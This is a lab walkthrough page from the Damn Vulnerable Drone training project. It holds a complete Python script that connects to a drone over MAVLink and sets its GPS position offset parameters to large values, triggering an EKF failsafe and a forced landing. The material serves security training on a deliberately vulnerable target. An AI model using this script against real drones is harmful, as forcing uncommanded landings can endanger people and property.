<i>Inducing a GPS glitch by skewing GPS position offsets to force the drone into an EKF failsafe, triggering a forced landing.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Denial of Service > GPS Offset Attack

# Description

The GPS Offset Attack involves manipulating the GPS position offset parameters to induce a GPS glitch. By setting the GPS offsets to their maximum values, the drone's position data becomes highly inaccurate, causing the EKF (Extended Kalman Filter) to detect inconsistencies and triggering a failsafe that forces the drone to land.

# Resources

- <a href="https://ardupilot.org/copter/docs/parameters.html">ArduPilot Documentation</a>  
- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://ardupilot.org/copter/docs/parameters.html#gps-pos1-x-antenna-x-position-offset">ArduCopter Parameters</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following code as <code>gps_offset_attack.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
import sys

def connect_drone(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected to the drone.")
    return master

def set_gps_position_offset(master, param_name, offset_value):
    master.mav.param_set_send(
        master.target_system,
        master.target_component,
        param_name.encode('utf-8'),
        offset_value,
        mavutil.mavlink.MAV_PARAM_TYPE_REAL32
    )
    print(f"{param_name} set to {offset_value}")

def main(target_ip, target_port, max_offset):
    master = connect_drone(target_ip, target_port)
    gps_params = ['GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS1_Z', 
                  'GPS_POS2_X', 'GPS_POS2_Y', 'GPS_POS2_Z']
    for param in gps_params:
        set_gps_position_offset(master, param, max_offset)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python gps_offset_attack.py &lt;target_ip:port&gt; &lt;max_offset&gt;")
        sys.exit(1)

    target = sys.argv[1]
    target_ip, target_port = target.split(':')
    target_port = int(target_port)
    max_offset = float(sys.argv[2])
    main(target_ip, target_port, max_offset)
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<pre><code class="code mb-3 mt-3">sudo python3 gps_offset_attack.py 10.13.0.3:5760 10</code></pre>

<p>This example sets all six GPS offset parameters to <code>10</code> meters. Replace the IP and port with your drone's values as needed.</p>

---

<h3>Step 4. Monitor the Effects</h3>
<p>Watch the GCS for signs of EKF failure and failsafe behavior:</p>
<ul>
  <li>GPS Glitch warnings</li>
  <li>EKF failsafe mode triggers</li>
  <li>Drone switching to <code>LAND</code> mode</li>
</ul>

---

<h3>Step 5. Restore Safe Operations</h3>
<p>Reset all GPS offset parameters back to <code>0</code> or reboot the drone to restore defaults. This ensures normal EKF operation resumes for safe flight.</p>

</details>
